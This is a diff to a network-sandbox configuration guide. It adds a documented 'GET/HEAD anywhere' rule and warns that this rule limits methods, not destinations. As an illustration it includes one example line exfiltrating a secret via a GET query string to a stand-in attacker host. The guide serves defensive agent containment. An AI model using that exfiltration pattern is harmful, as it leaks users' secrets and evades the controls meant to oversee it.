@@ -392,6 +392,50 @@ allow = ["*.nixos.org"]        # the whole nixos.org tree…
 deny  = ["evil.nixos.org"]     # …except this one subdomain
 ```
 
+**Read-only to the whole internet — GET anywhere, but no writes** (weigh the risk
+below before reaching for this):
+
+```toml
+[network]
+mode  = "deny"
+allow = ["{GET,HEAD} re:.*"]
+```
+
+Keep `mode = "deny"`: it is deny-by-default, so restricting the verbs is a matter of
+opening the hosts with a single read-only rule. `re:.*` matches every URL, so it
+opens every host — but only for `{GET,HEAD}`. A `POST`/`PUT`/`DELETE`, a WebSocket
+(which needs an explicit [`{WS}`](#method-scoping)), and a raw [`tcp://`](#raw-l4-splice-tcp)
+splice are all still refused, and the [SSRF guard](architecture.md#the-ssrf-guard)
+still blocks private, loopback, and metadata addresses — a `re:` rule never names an
+exact host, so it grants no internal-address exception.
+
+> **The risk this does not close — read before you use it.** It bounds the *method*,
+> not the *destination*. A GET carries arbitrary data in its path and query string, so
+> an agent can still exfiltrate to any public host: `GET https://attacker.example/?leak=<secret>`
+> is a plain GET and passes. So this posture is **not** a confidentiality boundary — it
+> only forbids body uploads and mutating verbs. For an agent you do not trust (the
+> [Mode-B default](../reference/glossary.md)), the real control is a **host
+> allowlist**: name the hosts the tool legitimately needs, never `re:.*`. Reach for
+> GET-anywhere only for a tool you already trust with your data and merely want to hold
+> to read-only semantics — e.g. a documentation or research reader that browses widely
+> but must not write.
+
+That example is already **HTTPS-only** by construction: a `re:` rule is enforced on
+the inspected-over-TLS layer, and cleartext HTTP is [strictly opt-in](#cleartext-http-http)
+per host (it takes an explicit `http://` rule), so `{GET,HEAD} re:.*` never permits
+plaintext. To make the intent explicit in the rule text, anchor the pattern to the
+scheme — equivalent, since the [canonical URL](#regex) a `re:` rule matches always
+begins `https://`:
+
+```toml
+[network]
+mode  = "deny"
+allow = ["{GET,HEAD} re:^https://"]   # GET/HEAD, HTTPS only, any host
+```
+
+The HTTPS-only guarantee here comes from the **layer**, not the anchor: opening
+cleartext GET to a host is always a separate, deliberate `http://` rule.
+
 **Raw SSH plus inspected HTTPS on the same host is a smell** — the L7 rule cannot
 apply to the spliced port. `ops config` warns when a host carries both an L4 allow
 and an overlapping L7 rule. Test any rule set with
